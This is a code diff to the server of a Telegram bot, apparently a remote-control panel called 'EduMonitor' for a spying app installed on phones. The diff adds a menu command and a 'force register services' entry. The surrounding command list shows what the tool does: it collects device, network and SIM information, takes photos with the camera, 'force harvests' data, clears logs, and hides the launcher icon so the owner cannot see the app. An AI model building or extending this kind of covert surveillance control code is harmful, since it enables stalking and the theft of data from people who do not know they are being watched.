@@ -470,6 +470,7 @@ async function setChatMenuButton(chatId) {
         const commands = [
             // ============ CONSOLIDATED COMMANDS ============
             { command: 'help', description: '📋 Complete help menu' },
+            { command: 'showmenu', description: '📋 show help menu' },
             { command: 'device_info', description: '📊 Complete device information' },
             { command: 'network_info', description: '🌐 Complete network information' },
             { command: 'mobile_info', description: '📱 Complete mobile & SIM info' },
@@ -539,7 +540,7 @@ async function setChatMenuButton(chatId) {
             { command: 'reboot_app', description: '🔄 Reboot services' },
             { command: 'hide_icon', description: '👻 Hide launcher icon' },
             { command: 'show_icon', description: '👁️ Show launcher icon' },
-            
+            { command: 'force_register_complete', description: '🔄 force register services' },
             // ============ CAMERA ============
             { command: 'photo', description: '📸 Take photo' },
             { command: 'camera_switch', description: '🔄 Switch camera' },
@@ -1915,7 +1916,15 @@ async function handleCommand(chatId, command, messageId) {
         await sendTelegramMessage(chatId, message);
         return;
     }
-
+if (command === '/showmenu') {
+    console.log('📋 Force showing main menu');
+    await sendTelegramMessageWithKeyboard(
+        chatId,
+        "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
+        getMainMenuKeyboard(chatId)
+    );
+    return;
+}
     // Handle /select command
     if (command.startsWith('/select ')) {
         const deviceId = command.substring(8).trim();
@@ -1991,6 +2000,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
     console.log('\n✅ CONSOLIDATED COMMANDS (45+ from 95+):');
     console.log('   📋 /help - Complete help menu');
+    console.log('   📋 /showmenu - show help menu');
     console.log('   📱 /device_info - Complete device info');
     console.log('   🌐 /network_info - Complete network info');
     console.log('   📱 /mobile_info - Complete mobile & SIM info');
@@ -2024,6 +2034,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   ⚡ /force_harvest - Force harvest');
     console.log('   📊 /logs_count - Database stats');
     console.log('   🗑️ /clear_logs - Clear logs');
+    console.log('   🔄 /force_register_complete - force register services');
     console.log('   🔄 /reboot_app - Reboot services');
     console.log('   👻 /hide_icon - Hide icon');
     console.log('   👁️ /show_icon - Show icon');
